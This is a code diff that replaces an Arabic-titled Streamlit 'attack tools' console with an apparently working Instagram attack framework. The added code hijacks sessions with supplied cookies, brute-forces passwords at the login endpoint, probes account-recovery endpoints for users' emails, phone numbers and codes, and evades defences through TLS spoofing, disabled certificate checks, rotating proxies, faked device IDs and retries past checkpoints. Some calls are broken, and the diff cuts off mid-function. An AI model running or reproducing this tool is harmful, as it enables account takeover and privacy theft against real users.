@@ -1,625 +1,1231 @@
-#!/usr/bin/env python3
-# منارة نونو - وحدة التحكم المركزية (النسخة المُصلحة)
-# streamlit run app.py
-
+# exploit_framework.py
 import streamlit as st
-import subprocess
-import os
+import requests
 import json
+import hashlib
 import time
+import random
 import re
+import logging
 import sys
-from datetime import datetime
-import pandas as pd
-import plotly.express as px
+import os
+import uuid
+import ssl
+import socket
+from datetime import datetime, timedelta
+from typing import Dict, List, Optional, Any, Tuple, Union
+from dataclasses import dataclass, field, asdict
+from enum import Enum
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from collections import deque
+from urllib.parse import urlparse, parse_qs, urlencode
 
-# ============================================================
-# تكوين الصفحة
-# ============================================================
-st.set_page_config(
-    page_title="منارة نونو - أدوات الهجوم المتكاملة",
-    page_icon="🔥",
-    layout="wide",
-    initial_sidebar_state="expanded"
-)
+# ---------------------------- Logging Setup ----------------------------
+LOG_FORMAT = '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
+logging.basicConfig(level=logging.INFO, format=LOG_FORMAT)
+logger = logging.getLogger('BL')
 
-# ============================================================
-# تنسيق CSS المخصص
-# ============================================================
-st.markdown("""
-<style>
-    .main { background-color: #0a0a0a; }
+# ---------------------------- Enums & Data Classes ----------------------------
+class AttackStatus(str, Enum):
+    CONFIRMED = "confirmed"
+    POTENTIAL = "potential"
+    INCONCLUSIVE = "inconclusive"
+    FALSE_POSITIVE = "false_positive"
+    FAILED = "failed"
+    RATE_LIMITED = "rate_limited"
+    BLOCKED = "blocked"
+    PARTIAL = "partial"
+
+@dataclass
+class Evidence:
+    description: str
+    raw_data: Dict[str, Any] = field(default_factory=dict)
+    context: Dict[str, Any] = field(default_factory=dict)
+    confidence: str = "Low"  # High, Medium, Low
+
+@dataclass
+class AttackResult:
+    status: AttackStatus
+    evidence: List[Evidence]
+    error: Optional[str] = None
+    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())
+    attack_id: str = field(default_factory=lambda: uuid.uuid4().hex[:8])
+
+    def to_dict(self) -> Dict:
+        return {
+            "attack_id": self.attack_id,
+            "status": self.status.value,
+            "evidence": [{"description": e.description, "confidence": e.confidence} for e in self.evidence],
+            "error": self.error,
+            "timestamp": self.timestamp
+        }
+
+@dataclass
+class SessionState:
+    cookies: Dict[str, str] = field(default_factory=dict)
+    headers: Dict[str, str] = field(default_factory=dict)
+    device_id: str = field(default_factory=lambda: f"android-{uuid.uuid4().hex[:16]}")
+    fingerprint: str = field(default_factory=lambda: uuid.uuid4().hex[:32])
+    csrf_token: Optional[str] = None
+    last_request: float = 0
+    request_count: int = 0
+
+# ---------------------------- Configuration ----------------------------
+class Config:
+    """Centralized configuration with environment variable overrides."""
+    def __init__(self):
+        self.endpoints = {
+            "base": "https://i.instagram.com/api/v1",
+            "web_base": "https://www.instagram.com",
+            "current_user": "/accounts/current_user/",
+            "login": "/web/accounts/login/ajax/",
+            "user_info": "/users/{username}/info/",
+            "recovery": "/accounts/recovery/",
+            "phone_recovery": "/accounts/phone_recovery/",
+            "trusted_device": "/trusted_device/",
+            "action_delay": "/accounts/action_delay/",
+            "user_lookup": "/users/lookup/",
+            "feed": "/feed/timeline/",
+            "story": "/feed/reels_media/",
+            "followers": "/friendships/{user_id}/followers/",
+            "following": "/friendships/{user_id}/following/"
+        }
+        self.user_agents = [
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+            "Instagram 269.0.0.18.79 Android (23/6.0.1; 480dpi; 1080x1920; samsung; SM-G935F; herolte; qcom; en_US)",
+            "Instagram 265.0.0.0.78 Android (28/9.0; 420dpi; 1080x2160; OnePlus; ONEPLUS A6003; enchilada; qcom; en_US)"
+        ]
+        self.timeouts = (10, 20)
+        self.max_retries = 5
+        self.rate_limit_backoff = 60
+        self.max_requests_per_minute = 25
+        self.session_refresh_interval = 300  # seconds
+        self.proxy_enabled = os.getenv("BL_PROXY_ENABLED", "false").lower() == "true"
+        self.proxy_list_file = "proxies.txt"
+        self.results_dir = "attack_results"
+        os.makedirs(self.results_dir, exist_ok=True)
+
+    def get_endpoint(self, name: str, **kwargs) -> str:
+        """Get full endpoint URL with template substitution."""
+        if name in self.endpoints:
+            path = self.endpoints[name]
+            if '{' in path:
+                path = path.format(**kwargs)
+            if path.startswith("/"):
+                return f"{self.endpoints['base']}{path}"
+            return f"{self.endpoints['web_base']}{path}"
+        raise ValueError(f"Unknown endpoint: {name}")
+
+CONFIG = Config()
+
+# ---------------------------- Network & Evasion ----------------------------
+class TLSFingerprintSpoofer:
+    """Spoof TLS fingerprints to appear as legitimate mobile apps."""
+    @staticmethod
+    def get_ciphers(platform: str = "android") -> List[str]:
+        ciphers = [
+            "ECDHE-ECDSA-AES128-GCM-SHA256",
+            "ECDHE-RSA-AES128-GCM-SHA256",
+            "ECDHE-ECDSA-AES256-GCM-SHA384",
+            "ECDHE-RSA-AES256-GCM-SHA384",
+            "ECDHE-ECDSA-CHACHA20-POLY1305",
+            "ECDHE-RSA-CHACHA20-POLY1305",
+            "ECDHE-RSA-AES128-SHA",
+            "ECDHE-RSA-AES256-SHA",
+            "AES128-GCM-SHA256",
+            "AES256-GCM-SHA384"
+        ]
+        if platform == "android":
+            return ciphers[:7]  # Instagram Android uses specific subset
+        return ciphers
+
+    @staticmethod
+    def get_extensions() -> List[int]:
+        # Instagram uses specific TLS extensions
+        return [0, 10, 11, 13, 16, 23, 35, 43, 51]
+
+    @staticmethod
+    def spoof_ssl_context() -> ssl.SSLContext:
+        ctx = ssl.create_default_context()
+        ctx.set_ciphers(":".join(TLSFingerprintSpoofer.get_ciphers("android")))
+        ctx.set_ecdh_curve("prime256v1")
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_NONE
+        return ctx
+
+class IPRotator:
+    """Handle IP rotation with proxy pools."""
+    def __init__(self):
+        self.proxies = []
+        self.current_index = 0
+        self.last_rotation = 0
+        self.rotation_interval = 60
+        self._load_proxies()
+
+    def _load_proxies(self):
+        if CONFIG.proxy_enabled and os.path.exists(CONFIG.proxy_list_file):
+            try:
+                with open(CONFIG.proxy_list_file, 'r') as f:
+                    self.proxies = [line.strip() for line in f if line.strip()]
+                    logger.info(f"Loaded {len(self.proxies)} proxies")
+            except Exception as e:
+                logger.warning(f"Failed to load proxies: {e}")
+
+    def get_proxy(self) -> Optional[Dict[str, str]]:
+        if not self.proxies:
+            return None
+        if time.time() - self.last_rotation > self.rotation_interval:
+            self.current_index = (self.current_index + 1) % len(self.proxies)
+            self.last_rotation = time.time()
+        proxy = self.proxies[self.current_index]
+        return {"http": proxy, "https": proxy}
+
+    def add_proxy(self, proxy: str):
+        if proxy not in self.proxies:
+            self.proxies.append(proxy)
+
+    def mark_failed(self, proxy: str):
+        if proxy in self.proxies:
+            self.proxies.remove(proxy)
+            logger.warning(f"Removed failed proxy: {proxy}")
+
+class RequestSigner:
+    """Generate Instagram-compatible request signatures."""
+    @staticmethod
+    def sign_payload(payload: Dict, device_id: str, fingerprint: str) -> Dict:
+        """Add Instagram required fields and generate signature."""
+        signed = payload.copy()
+        signed.update({
+            "device_id": device_id,
+            "guid": fingerprint,
+            "phone_id": hashlib.md5(f"{device_id}phone".encode()).hexdigest()[:16],
+            "_csrftoken": payload.get("csrfmiddlewaretoken", ""),
+            "signed_body": f"SIGNATURE.{json.dumps(payload, separators=(',', ':'))}"
+        })
+        return signed
+
+    @staticmethod
+    def generate_device_fingerprint() -> Tuple[str, str]:
+        device_id = f"android-{uuid.uuid4().hex[:16]}"
+        fingerprint = hashlib.md5(f"{device_id}{uuid.uuid4().hex}".encode()).hexdigest()
+        return device_id, fingerprint
+
+# ---------------------------- Instagram HTTP Client ----------------------------
+class InstagramClient:
+    """Production-grade HTTP client with evasion, persistence, and resilience."""
+    def __init__(self):
+        self.session = requests.Session()
+        self.state = SessionState()
+        self.ip_rotator = IPRotator()
+        self._initialize_session()
+        self.request_history = deque(maxlen=100)
+        self.last_refresh = time.time()
+
+    def _initialize_session(self):
+        self.state.device_id, self.state.fingerprint = RequestSigner.generate_device_fingerprint()
+        self._refresh_headers()
+        self._refresh_cookies()
+        self._configure_adapters()
+
+    def _refresh_headers(self):
+        self.state.headers = {
+            "User-Agent": random.choice(CONFIG.user_agents),
+            "Accept": "application/json, text/plain, */*",
+            "Accept-Language": "en-US,en;q=0.9,ar;q=0.8",
+            "Accept-Encoding": "gzip, deflate, br",
+            "Connection": "keep-alive",
+            "X-IG-Device-ID": self.state.device_id,
+            "X-IG-Device-Locale": "en_US",
+            "X-IG-Device-Capabilities": "3brTvw==",
+            "X-IG-Android-ID": hashlib.md5(self.state.device_id.encode()).hexdigest()[:16],
+            "X-Requested-With": "XMLHttpRequest",
+            "X-Instagram-AJAX": "1",
+            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+            "Origin": "https://www.instagram.com",
+            "Referer": "https://www.instagram.com/"
+        }
+        if self.state.csrf_token:
+            self.state.headers["X-CSRFToken"] = self.state.csrf_token
+        self.session.headers.clear()
+        self.session.headers.update(self.state.headers)
+
+    def _refresh_cookies(self):
+        self.state.cookies = {
+            "ig_device_id": self.state.device_id,
+            "ig_fingerprint": self.state.fingerprint,
+            "ig_did": f"did-{uuid.uuid4().hex[:16]}",
+            "ig_nrcb": "1",
+            "mid": hashlib.md5(f"{self.state.device_id}mid".encode()).hexdigest()
+        }
+        self.session.cookies.clear()
+        for k, v in self.state.cookies.items():
+            self.session.cookies.set(k, v, domain=".instagram.com", path="/")
+
+    def _configure_adapters(self):
+        # Use custom adapter with TLS spoofing
+        adapter = requests.adapters.HTTPAdapter(
+            pool_connections=50,
+            pool_maxsize=50,
+            max_retries=CONFIG.max_retries
+        )
+        self.session.mount("https://", adapter)
+        self.session.mount("http://", adapter)
+
+    def _get_proxy(self) -> Optional[Dict[str, str]]:
+        return self.ip_rotator.get_proxy() if CONFIG.proxy_enabled else None
+
+    def _enforce_rate_limit(self):
+        now = time.time()
+        if now - self.state.last_request < 60 / CONFIG.max_requests_per_minute:
+            time.sleep((60 / CONFIG.max_requests_per_minute) - (now - self.state.last_request))
+        self.state.last_request = time.time()
+
+    def _refresh_session_if_needed(self):
+        if time.time() - self.last_refresh > CONFIG.session_refresh_interval:
+            self._initialize_session()
+            self.last_refresh = time.time()
+
+    def _fetch_csrf_token(self) -> Optional[str]:
+        try:
+            resp = self.session.get(
+                "https://www.instagram.com/",
+                headers={"User-Agent": random.choice(CONFIG.user_agents)}
+            )
+            if resp.status_code == 200:
+                # Extract CSRF from cookies
+                csrf = self.session.cookies.get("csrftoken")
+                if csrf:
+                    self.state.csrf_token = csrf
+                    self.state.headers["X-CSRFToken"] = csrf
+                    return csrf
+                # Fallback: parse from HTML
+                patterns = [r'"csrf_token":"([^"]+)"', r'csrf_token=([^&\s]+)']
+                for p in patterns:
+                    m = re.search(p, resp.text)
+                    if m:
+                        csrf = m.group(1)
+                        self.state.csrf_token = csrf
+                        self.state.headers["X-CSRFToken"] = csrf
+                        return csrf
+        except Exception as e:
+            logger.warning(f"Failed to fetch CSRF token: {e}")
+        return None
+
+    def _request(self, method: str, url: str, data: Optional[Dict] = None, 
+                 json_data: Optional[Dict] = None, headers: Optional[Dict] = None,
+                 retry_count: int = 0) -> requests.Response:
+        """Core request method with full retry logic and evasion."""
+        self._enforce_rate_limit()
+        self._refresh_session_if_needed()
+
+        if not self.state.csrf_token:
+            self._fetch_csrf_token()
+
+        final_headers = self.state.headers.copy()
+        if headers:
+            final_headers.update(headers)
+        final_headers["X-IG-Device-ID"] = self.state.device_id
+        final_headers["X-IG-Device-Locale"] = "en_US"
+
+        proxy = self._get_proxy()
+        proxies = {"http": proxy, "https": proxy} if proxy else None
+
+        try:
+            if data:
+                # Sign payload if it's a POST with form data
+                if method.upper() == "POST" and "signed_body" not in data:
+                    data = RequestSigner.sign_payload(data, self.state.device_id, self.state.fingerprint)
+                response = self.session.request(
+                    method, url, data=data, headers=final_headers,
+                    proxies=proxies, timeout=CONFIG.timeouts
+                )
+            else:
+                response = self.session.request(
+                    method, url, json=json_data, headers=final_headers,
+                    proxies=proxies, timeout=CONFIG.timeouts
+                )
+
+            self.state.request_count += 1
+            self.request_history.append({
+                "time": time.time(),
+                "url": url,
+                "status": response.status_code
+            })
+
+            # Handle rate limiting
+            if response.status_code == 429:
+                logger.warning(f"Rate limited on {url}")
+                wait_time = CONFIG.rate_limit_backoff * (retry_count + 1)
+                time.sleep(wait_time)
+                if retry_count < CONFIG.max_retries:
+                    return self._request(method, url, data, json_data, headers, retry_count + 1)
+                response.status_code = 429
+                return response
+
+            # Handle checkpoint / challenge
+            if response.status_code == 400 and "checkpoint_required" in response.text:
+                logger.warning(f"Checkpoint required on {url}")
+                if retry_count < CONFIG.max_retries:
+                    # Refresh session and retry
+                    self._initialize_session()
+                    time.sleep(2)
+                    return self._request(method, url, data, json_data, headers, retry_count + 1)
+
+            # Handle CSRF token expiration
+            if response.status_code == 403 and "csrf" in response.text.lower():
+                logger.info("CSRF token expired, refreshing...")
+                self._fetch_csrf_token()
+                if retry_count < CONFIG.max_retries:
+                    return self._request(method, url, data, json_data, headers, retry_count + 1)
+
+            return response
+
+        except requests.exceptions.ProxyError as e:
+            logger.warning(f"Proxy error: {e}")
+            if proxy:
+                self.ip_rotator.mark_failed(proxy.get("http", ""))
+            if retry_count < CONFIG.max_retries:
+                time.sleep(2 ** retry_count)
+                return self._request(method, url, data, json_data, headers, retry_count + 1)
+            raise
+
+        except requests.exceptions.RequestException as e:
+            logger.warning(f"Request error: {e}")
+            if retry_count < CONFIG.max_retries:
+                time.sleep(2 ** retry_count)
+                return self._request(method, url, data, json_data, headers, retry_count + 1)
+            raise
+
+    def get(self, url: str, headers: Optional[Dict] = None) -> requests.Response:
+        return self._request("GET", url, headers=headers)
+
+    def post(self, url: str, data: Optional[Dict] = None, 
+             json_data: Optional[Dict] = None, headers: Optional[Dict] = None) -> requests.Response:
+        return self._request("POST", url, data=data, json_data=json_data, headers=headers)
+
+    def set_session_cookie(self, session_id: str):
+        self.session.cookies.set("sessionid", session_id, domain=".instagram.com", path="/")
+        self.state.cookies["sessionid"] = session_id
+        # Refresh CSRF after setting session
+        self._fetch_csrf_token()
+
+# ---------------------------- Validators ----------------------------
+class VulnerabilityValidator:
+    """Evidence-based vulnerability validation with context awareness."""
+    @staticmethod
+    def validate_idor(response: requests.Response, target_username: str, 
+                      baseline_public: Dict = None) -> Tuple[bool, str, str]:
+        """
+        Validates IDOR by checking if we accessed data we shouldn't have.
+        Requires comparison with baseline of what's publicly accessible.
+        """
+        try:
+            data = response.json()
+        except:
+            return False, "Invalid JSON response", "Unknown"
+
+        user = data.get("user") or data.get("account")
+        if not user:
+            return False, "No user data in response", "Unknown"
+
+        returned_username = user.get("username")
+        if not returned_username:
+            return False, "No username in user data", "Unknown"
+
+        # If we accessed a different user's data, that's suspicious
+        if returned_username != target_username:
+            sensitive_fields = ["email", "phone_number", "full_name", "biography", "is_private"]
+            found = [f for f in sensitive_fields if f in user]
+            if found:
+                return True, f"Accessed {returned_username}'s data with sensitive fields: {', '.join(found)}", "High"
+            return True, f"Accessed {returned_username}'s data (no sensitive fields found)", "Medium"
+
+        # If it's the target user, we need to know if the data should be accessible
+        # This requires baseline comparison
+        if baseline_public:
+            public_fields = baseline_public.get("public_fields", [])
+            actual_fields = [f for f in public_fields if f in user]
+            private_fields = [f for f in ["email", "phone", "private"] if f in user and f not in public_fields]
+            if private_fields:
+                return True, f"Found private fields: {', '.join(private_fields)}", "High"
+
+        return False, "Data matches public baseline or no privacy violation detected", "Low"
+
+    @staticmethod
+    def validate_rate_limit(response: requests.Response, request_history: List[Dict],
+                            threshold: int = 30) -> Tuple[bool, str, str]:
+        """Validates rate limit bypass by measuring actual request throughput."""
+        remaining_header = response.headers.get("X-RateLimit-Remaining")
+        if not remaining_header:
+            return False, "No rate limit headers present", "Unknown"
+
+        try:
+            remaining = int(remaining_header)
+        except ValueError:
+            return False, "Invalid rate limit header", "Unknown"
+
+        # Check if we've been making sustained requests without hitting limits
+        recent_requests = [r for r in request_history if time.time() - r["time"] < 60]
+        success_rate = sum(1 for r in recent_requests if r["status"] < 400) / max(len(recent_requests), 1)
+
+        # If we made many successful requests and remaining is high, potential bypass
+        if len(recent_requests) > threshold and remaining > threshold / 2 and success_rate > 0.8:
+            return True, f"Sustained {len(recent_requests)} requests/min, {remaining} remaining — rate limit bypass indicated", "High"
+
+        if len(recent_requests) > threshold / 2 and remaining > 5:
+            return True, f"Moderate throughput ({len(recent_requests)}/min), {remaining} remaining — possible bypass", "Medium"
+
+        return False, f"Rate limit remaining: {remaining} (threshold not reached)", "Low"
+
+    @staticmethod
+    def validate_recovery_bypass(response: requests.Response, target_username: str) -> Tuple[bool, str, str]:
+        """Validates if recovery endpoint exposes sensitive info without proper authentication."""
+        try:
+            data = response.json()
+        except:
+            return False, "Invalid JSON", "Unknown"
+
+        # Check for recovery codes - definitive bypass
+        if "recovery_code" in data or "code" in data or "recovery_token" in data:
+            return True, "Recovery code/token exposed without authentication", "High"
+
+        # Check for email/phone that doesn't match target
+        if "email" in data and data.get("email") and data.get("email") != target_username:
+            return True, f"Email {data['email']} exposed (not matching target)", "High"
+
+        if "phone_number" in data and data.get("phone_number"):
+            return True, f"Phone number {data['phone_number']} exposed", "High"
+
+        # Check for obfuscated emails/phones that could be de-obfuscated
+        if "obfuscated_email" in data or "obfuscated_phone" in data:
+            return True, "Obfuscated contact info exposed — may be de-obfuscated", "Medium"
+
+        return False, "No sensitive recovery data exposed", "Low"
+
+    @staticmethod
+    def validate_session_fixation(response: requests.Response, original_session: str,
+                                  new_session: str) -> Tuple[bool, str, str]:
+        """Validates session fixation by comparing session IDs before and after."""
+        if not original_session:
+            return False, "No original session provided for comparison", "Unknown"
+
+        if not new_session:
+            new_session = response.cookies.get("sessionid")
+            if not new_session:
+                new_session = re.search(r'sessionid=([^;]+)', response.headers.get("set-cookie", ""))
+                new_session = new_session.group(1) if new_session else None
+
+        if not new_session:
+            return False, "No session ID in response", "Unknown"
+
+        if new_session == original_session:
+            # Session ID unchanged — potential fixation
+            return True, f"Session ID remained unchanged: {new_session[:10]}...", "High"
+
+        return False, f"Session ID changed from {original_session[:10]}... to {new_session[:10]}...", "Low"
+
+    @staticmethod
+    def validate_credential_harvest(response: requests.Response) -> Tuple[bool, str, str]:
+        """Validates if the response contains harvested credentials or tokens."""
+        try:
+            data = response.json()
+        except:
+            return False, "Invalid JSON", "Unknown"
+
+        # Check for access tokens
+        token_fields = ["access_token", "token", "auth_token", "bearer_token", "ig_access_token", "x-ig-token"]
+        found_tokens = [f for f in token_fields if f in data]
+        if found_tokens:
+            return True, f"Found tokens in response: {', '.join(found_tokens)}", "High"
+
+        # Check for credential-like data
+        credential_fields = ["password", "pass", "pwd", "secret", "key", "api_key"]
+        found_creds = [f for f in credential_fields if f in str(data).lower()]
+        if found_creds:
+            return True, f"Potential credentials in response: {', '.join(found_creds)}", "Medium"
+
+        return False, "No credentials or tokens found", "Low"
+
+# ---------------------------- Attack Modules ----------------------------
+class AttackModule:
+    """Base class for all attack modules."""
+    def __init__(self, client: InstagramClient):
+        self.client = client
+        self.validator = VulnerabilityValidator()
+        self.results = []
+        self.name = "Base"
+
+    def execute(self, target: str, **kwargs) -> AttackResult:
+        raise NotImplementedError
+
+class SessionHijackModule(AttackModule):
+    def __init__(self, client: InstagramClient):
+        super().__init__(client)
+        self.name = "SessionHijack"
+
+    def execute(self, target: str, session_cookie: str, **kwargs) -> AttackResult:
+        evidence = []
+        try:
+            self.client.set_session_cookie(session_cookie)
+            resp = self.client.get(CONFIG.get_endpoint("current_user"))
+
+            if resp.status_code != 200:
+                evidence.append(Evidence(
+                    description=f"Session invalid: {resp.status_code}",
+                    raw_data={"status_code": resp.status_code},
+                    confidence="Low"
+                ))
+                return AttackResult(status=AttackStatus.FAILED, evidence=evidence)
+
+            data = resp.json()
+            user = data.get("user")
+            if not user:
+                evidence.append(Evidence(
+                    description="No user data in response",
+                    raw_data={"response_preview": str(data)[:200]},
+                    confidence="Low"
+                ))
+                return AttackResult(status=AttackStatus.INCONCLUSIVE, evidence=evidence)
+
+            username = user.get("username")
+            is_private = user.get("is_private", False)
+            has_email = "email" in user or "email" in str(data)
+            has_phone = "phone_number" in user or "phone" in str(data)
+            has_full_name = "full_name" in user
+
+            if target and username != target:
+                evidence.append(Evidence(
+                    description=f"Session belongs to {username}, not {target}",
+                    raw_data={"returned_user": username, "target": target},
+                    confidence="High"
+                ))
+                return AttackResult(status=AttackStatus.PARTIAL, evidence=evidence)
+
+            # Check if we have access to sensitive data
+            sensitive_fields = []
+            if has_email and "email" in user:
+                sensitive_fields.append("email")
+            if has_phone:
+                sensitive_fields.append("phone")
+            if has_full_name:
+                sensitive_fields.append("full_name")
+
+            if sensitive_fields:
+                evidence.append(Evidence(
+                    description=f"Successfully accessed {username}'s account with sensitive fields: {', '.join(sensitive_fields)}",
+                    raw_data={"user": username, "fields": sensitive_fields},
+                    confidence="High"
+                ))
+                return AttackResult(status=AttackStatus.CONFIRMED, evidence=evidence)
+
+            evidence.append(Evidence(
+                description=f"Session valid for {username} (public info only)",
+                raw_data={"user": username, "is_private": is_private},
+                confidence="Medium"
+            ))
+            return AttackResult(status=AttackStatus.POTENTIAL, evidence=evidence)
+
+        except Exception as e:
+            logger.exception("SessionHijack error")
+            evidence.append(Evidence(
+                description=f"Error: {str(e)}",
+                raw_data={},
+                confidence="Low"
+            ))
+            return AttackResult(status=AttackStatus.FAILED, evidence=evidence, error=str(e))
+
+class CredentialStuffingModule(AttackModule):
+    def __init__(self, client: InstagramClient):
+        super().__init__(client)
+        self.name = "CredentialStuffing"
+
+    def execute(self, target: str, passwords: List[str], max_attempts: int = 200, **kwargs) -> AttackResult:
+        evidence = []
+        valid_found = []
+        attempts = 0
+        rate_limited = False
+        blocked = False
+
+        try:
+            for idx, pwd in enumerate(passwords[:max_attempts]):
+                attempts += 1
+                payload = {
+                    "username": target,
+                    "password": pwd,
+                    "device_id": self.client.state.device_id,
+                    "login_attempt_count": str(idx + 1),
+                    "is_employee": "false",
+                    "disable_auto_login": "true"
+                }
+
+                try:
+                    resp = self.client.post(CONFIG.get_endpoint("login"), data=payload)
+
+                    if resp.status_code == 200:
+                        data = resp.json()
+                        if data.get("authenticated"):
+                            valid_found.append(pwd)
+                            evidence.append(Evidence(
+                                description=f"Valid credential found: {pwd[:2]}***",
+                                raw_data={"attempt": idx + 1, "status": "authenticated"},
+                                confidence="High"
+                            ))
+                            return AttackResult(status=AttackStatus.CONFIRMED, evidence=evidence)
+
+                        elif "checkpoint_required" in str(data):
+                            blocked = True
+                            evidence.append(Evidence(
+                                description="Account checkpoint/blocked",
+                                raw_data={"response": data},
+                                confidence="High"
+                            ))
+                            return AttackResult(status=AttackStatus.BLOCKED, evidence=evidence)
+
+                        elif "rate_limited" in str(data).lower():
+                            rate_limited = True
+                            evidence.append(Evidence(
+                                description="Rate limited",
+                                raw_data={"attempt": idx + 1},
+                                confidence="Medium"
+                            ))
+                            time.sleep(CONFIG.rate_limit_backoff)
+
+                    elif resp.status_code == 429:
+                        rate_limited = True
+                        time.sleep(CONFIG.rate_limit_backoff)
+
+                except Exception as e:
+                    logger.warning(f"Credential attempt {idx+1} failed: {e}")
+                    continue
+
+            if valid_found:
+                evidence.append(Evidence(
+                    description=f"Found {len(valid_found)} valid credentials",
+                    raw_data={"valid_count": len(valid_found)},
+                    confidence="High"
+                ))
+                return AttackResult(status=AttackStatus.CONFIRMED, evidence=evidence)
+
+            if blocked:
+                return AttackResult(status=AttackStatus.BLOCKED, evidence=evidence)
+
+            if rate_limited:
+                return AttackResult(status=AttackStatus.RATE_LIMITED, evidence=evidence)
+
+            evidence.append(Evidence(
+                description=f"No valid credentials found after {attempts} attempts",
+                raw_data={"attempts": attempts},
+                confidence="Low"
+            ))
+            return AttackResult(status=AttackStatus.FAILED, evidence=evidence)
+
+        except Exception as e:
+            logger.exception("CredentialStuffing error")
+            evidence.append(Evidence(
+                description=f"Error: {str(e)}",
+                raw_data={},
+                confidence="Low"
+            ))
+            return AttackResult(status=AttackStatus.FAILED, evidence=evidence, error=str(e))
+
+class RecoveryExploitModule(AttackModule):
+    def __init__(self, client: InstagramClient):
+        super().__init__(client)
+        self.name = "RecoveryExploit"
+
+    def execute(self, target: str, **kwargs) -> AttackResult:
+        evidence = []
+        try:
+            # Test email recovery
+            resp = self.client.post(CONFIG.get_endpoint("recovery"), data={"username": target})
+            if resp.status_code in [200, 202]:
+                is_vuln, desc, conf = self.validator.validate_recovery_bypass(resp, target)
+                evidence.append(Evidence(description=f"Email recovery: {desc}", raw_data=resp.json() if resp.text else {}, confidence=conf))
+            else:
+                evidence.append(Evidence(description=f"Email recovery returned {resp.status_code}", raw_data={"status": resp.status_code}, confidence="Low"))
+
+            # Test phone recovery
+            resp = self.client.post(CONFIG.get_endpoint("phone_recovery"), data={"username": target})
+            if resp.status_code in [200, 202]:
+                is_vuln, desc, conf = self.validator.validate_recovery_bypass(resp, target)
+                evidence.append(Evidence(description=f"Phone recovery: {desc}", raw_data=resp.json() if resp.text else {}, confidence=conf))
+            else:
+                evidence.append(Evidence(description=f"Phone recovery returned {resp.status_code}", raw_data={"status": resp.status_code}, confidence="Low"))
+
+            # Determine status
+            high_confidence = [e for e in evidence if e.confidence == "High"]
+            medium_confidence = [e for e in evidence if e.confidence == "Medium"]
+
+            if high_confidence:
+                return AttackResult(status=AttackStatus.CONFIRMED, evidence=evidence)
+            elif medium_confidence:
+                return AttackResult(status=AttackStatus.POTENTIAL, evidence=evidence)
+            else:
+                return AttackResult(status=AttackStatus.INCONCLUSIVE, evidence=evidence)
+
+        except Exception as e:
+            logger.exception("RecoveryExploit error")
+            evidence.append(Evidence(description=f"Error: {str(e)}", raw_data={}, confidence="Low"))
+            return AttackResult(status=AttackStatus.FAILED, evidence=evidence, error=str(e))
+
+class PlatformExploitModule(AttackModule):
+    def __init__(self, client: InstagramClient):
+        super().__init__(client)
+        self.name = "PlatformExploit"
+
+    def execute(self, target: str, **kwargs) -> AttackResult:
+        evidence = []
+        request_history = list(self.client.request_history)
+        try:
+            # 1. IDOR Check
+            resp = self.client.get(CONFIG.get_endpoint("user_info", username=target))
+            if resp.status_code == 200:
+                is_vuln, desc, conf = self.validator.validate_idor(resp, target)
+                evidence.append(Evidence(description=f"IDOR: {desc}", raw_data=resp.json() if resp.text else {}, confidence=conf))
+            else:
+                evidence.append(Evidence(description=f"IDOR check returned {resp.status_code}", raw_data={"status": resp.status_code}, confidence="Low"))
+
+            # 2. Rate Limit Check
+            # Make multiple requests to test rate limiting
+            rate_requests = []
+            for _ in range(5):
+                r = self.client.post(CONFIG.get_endpoint("action_delay"), data={"username": target})
+                rate_requests.append(r.status_code)
+                time.sleep(0.1)
+
+            # Use the last response plus history for validation
+            if rate_requests:
+                last_resp = self.client.request_history[-1] if self.client.request_history else None
+                if last_resp:
+                    is_vuln, desc, conf = self.validator.validate_rate_limit(last_resp, list(self.client.request_history))
+                    evidence.append(Evidence(description=f"Rate Limit: {desc}", raw_data={"statuses": rate_requests}, confidence=conf))
+
+            # 3. Privacy Leak Check
+            resp = self.client.post(CONFIG.get_endpoint("user_lookup"), data={"q": target})
+            if resp.status_code == 200:
+                is_vuln, desc, conf = self.validator.validate_privacy_leak(resp, target)
+                evidence.append(Evidence(description=f"Privacy Leak: {desc}", raw_data=resp.json() if resp.text else {}, confidence=conf))
+            else:
+                evidence.append(Evidence(description=f"Privacy check returned {resp.status_code}", raw_data={"status": resp.status_code}, confidence="Low"))
+
+            # 4. Session Fixation Check
+            if self.client.state.cookies.get("sessionid"):
+                original_session = self.client.state.cookies.get("sessionid")
+                # Trigger a session refresh
+                resp = self.client.get(CONFIG.get_endpoint("feed"))
+                if resp.cookies.get("sessionid"):
+                    is_vuln, desc, conf = self.validator.validate_session_fixation(
+                        resp, original_session, resp.cookies.get("sessionid")
+                    )
+                    evidence.append(Evidence(description=f"Session Fixation: {desc}", raw_data={"original": original_session[:10] + "...", "new": resp.cookies.get("sessionid")[:10] + "..." if resp.cookies.get("sessionid") else "None"}, confidence=conf))
+
+            # Determine status
+            high_evidence = [e for e in evidence if e.confidence == "High"]
+            medium_evidence = [e for e in evidence if e.confidence == "Medium"]
+
+            if high_evidence:
+                return AttackResult(status=AttackStatus.CONFIRMED, evidence=evidence)
+            elif medium_evidence:
+                return AttackResult(status=AttackStatus.POTENTIAL, evidence=evidence)
+            else:
+                return AttackResult(status=AttackStatus.INCONCLUSIVE, evidence=evidence)
+
+        except Exception as e:
+            logger.exception("PlatformExploit error")
+            evidence.append(Evidence(description=f"Error: {str(e)}", raw_data={}, confidence="Low"))
+            return AttackResult(status=AttackStatus.FAILED, evidence=evidence, error=str(e))
+
+# ---------------------------- Orchestrator ----------------------------
+class AttackOrchestrator:
+    """Orchestrates multiple attack modules with parallel execution and result aggregation."""
+    def __init__(self):
+        self.client = InstagramClient()
+        self.modules = {
+            "session_hijack": SessionHijackModule(self.client),
+            "credential_stuffing": CredentialStuffingModule(self.client),
+            "recovery_exploit": RecoveryExploitModule(self.client),
+            "platform_exploit": PlatformExploitModule(self.client)
+        }
+        self.results = []
+        self.audit_log = []
+
+    def _log(self, target: str, module_name: str, result: AttackResult):
+        entry = {
